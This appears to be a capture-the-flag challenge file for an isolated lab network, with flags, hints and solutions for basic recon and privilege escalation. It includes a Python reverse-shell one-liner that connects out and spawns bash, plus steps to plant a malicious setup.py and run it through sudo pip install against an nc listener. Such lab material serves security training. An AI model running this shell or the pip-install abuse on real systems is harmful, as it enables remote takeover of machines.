box.name: All you need
box.description: You managed to gain access to a private campus network. Seems like there is a lot of suspicious activity going on. Can you help us to gain more information or even better take over control? \ Connect to you personal instance: **ssh enumerator@<CHALLENGE_SERVER_IP> -p 1337 -i session_manager_key** \ Note: Download the **session_manager_key** and set the correct permissions: **chmod 600 session_manager_key** \ The market offers a source code for this challenge \ Your are spawned into a Kali machine in an isolated network. As a result you can't access services directly from you work station. Any web resources may be available through the same port but on the corresponding public address (eg. <CHALLENGE_SERVER_IP>)

flag.name: Network
flag.description: What is your ip address?

hint.description: Find network information with [ifconfig](https://www.computerhope.com/unix/uifconfi.htm#desc)

Solution: 172.31.**X**.2 \ Where **X** needs to be replaced with your address seen at the **inet ...** part of the ifconfig output, eg. **172.31.68.2**
``` # ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.31.68.2 netmask 255.255.255.0 broadcast 172.31.68.255 ```

flag.name: Target Address
flag.description: What is the address of the target machine?

hint.description: Find other hosts in a network with **netdiscover**
By default netdiscover scans the private range 192.168.1.0/16 \ To specify a range to scan use **-r 172.31.\<YOUR_NETWORK\>.0/24**

Solution: 172.31.**X**.3 \ Where **X** needs to be replaced with your address seen at the **inet ...** part of the ifconfig output, eg. **172.31.68.3**
``` # ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.31.68.2 netmask 255.255.255.0 broadcast 172.31.68.255 ```

Note: Modify **HOST** and **PORT** ```python #!/usr/bin/python2
a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("HOST",PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash") ```

hint.description:
To exploit this PIP vulnerability use [FakePip](https://github.com/0x00-0x00/FakePip)
Download: [raw setup.py](https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py)

The easiest way is to edit the script on you kali machine and serve it again with a python SimpleHTTPServer than download it with wget to the shop machine. \ On Kali: Edit file: **vim setup.py** The shop machine only knows the command **python2** and not **python**. Therefore the reverse shell code needs to be adapted to use **python2 -c "..."** instead. \ Serve file: **python2 -m SimpleHTTPServer 8000** \ On shop machine: Download file from kali with wget: **wget http://<KALI_IP>:8000/setup.py**

Make sure to start a new nc listener on your attacker machine and edit the setup.py HOST/PORT accordingly . Then execute the pip install command on the target machine: **sudo /usr/bin/pip install . --upgrade force-reinstall**
Enumeration FTW
